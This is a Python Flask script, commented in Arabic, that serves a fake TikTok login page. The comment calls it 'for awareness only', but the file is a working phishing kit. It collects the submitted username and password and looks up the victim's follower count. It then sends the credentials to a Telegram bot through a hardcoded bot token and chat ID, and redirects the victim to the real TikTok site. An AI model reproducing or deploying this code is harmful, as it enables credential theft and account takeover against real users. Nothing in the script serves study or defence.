from flask import Flask, request, redirect, render_template_string
import requests

app = Flask(__name__)

# HTML مباشرة (واجهة تسجيل دخول مزيفة للتوعية فقط)
html_page = """
<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول | TikTok</title>
</head>
<body style="text-align:center; font-family:sans-serif;">
  <h2>تسجيل الدخول إلى TikTok</h2>
  <form action="/save" method="POST">
    <input type="text" name="username" placeholder="اسم المستخدم" required><br><br>
    <input type="password" name="password" placeholder="كلمة المرور" required><br><br>
    <button type="submit">تسجيل الدخول</button>
  </form>
</body>
</html>
"""

# ✅ إعدادات البوت
BOT_TOKEN = "7504294266:AAHgYMIxq5G1hxXRmGF2O7zYKKi-bPjReeM"
ADMIN_ID = "7758666677"

@app.route("/", methods=["GET"])
def home():
    return render_template_string(html_page)

@app.route("/save", methods=["POST"])
def save():
    username = request.form.get("username")
    password = request.form.get("password")
    
    # محاولة جلب عدد المتابعين من API خارجي
    try:
        r = requests.get(f"https://api.countik.com/user/{username}")
        followers = r.json().get("followers", "غير معروف")
    except:
        followers = "غير معروف"

    message = f"صيد تعليمي جديد 🎯\\n👤 المستخدم: @{username}\\n🔐 كلمة المرور: {password}\\n👥 عدد المتابعين: {followers}"

    # إرسال إلى تيليجرام
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": ADMIN_ID,
            "text": message
        }
        requests.post(url, data=data)
    except:
        pass

    return redirect("https://tiktok.com")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
